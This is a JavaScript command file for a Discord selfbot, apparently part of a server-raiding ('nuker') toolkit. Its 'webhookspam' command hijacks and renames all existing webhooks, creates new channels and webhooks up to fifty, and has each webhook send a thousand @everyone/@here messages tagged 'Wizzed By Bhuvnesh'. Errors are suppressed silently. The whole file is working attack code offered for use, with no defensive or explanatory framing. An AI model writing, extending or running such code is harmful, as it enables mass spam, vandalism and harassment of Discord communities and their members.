const { TextChannel, Guild, Webhook } = require("discord.js");
const { Client: Client, Message: Message, MessageEmbed: MessageEmbed } = require("discord.js-selfbot"),
  { send: send } = require("../../Utility/functions");
module.exports = {
  name: "webhookspam",
  aliases: ["webspam", "webspammer", "webhookspammer"],
  description: "Creates 50 Channel With 50 Webhooks!",
  run: async (e, s, a) => {
    try {
      const { guild: a } = s;
      if (!a.me.permissions.has("MANAGE_WEBHOOKS")) return await s.channel.send("Missing **`MANAGE_WEBHOOKS`** Permission!");
      if (!a.me.permissions.has("MANAGE_CHANNELS")) return await s.channel.send("Missing **`MANAGE_CHANNELS`** Permission!");

      const hooks = await a.fetchWebhooks();

      const hookspam = (hook) => {
        for (let v = 0; v < 1000; v++) {
          hook.send("||@everyone||||@here|| Get Wizzed By Bhuvnesh 😜").catch(() => {});
        }
      };

      hooks.map((h) => {
        h.edit({ name: "Wizzed By Bhuvnesh", avatar: e.owner.displayAvatarURL({ dynamic: true }) }).catch(() => {});
        hookspam(h);
      });

      for (let x = 0; x < 50 - hooks.size; x++) {
        a.channels
          .create("wizzed-by-bhuvnesh")
          .then((c) => {
            c.createWebhook("Wizzed By Bhuvnesh", { avatar: e.owner.displayAvatarURL({ dynamic: true }) })
              .then((w) => hookspam(w))
              .catch(() => {});
          })
          .catch(() => {});
      }
    } catch (e) {
      throw new Error(e);
    }
  },
};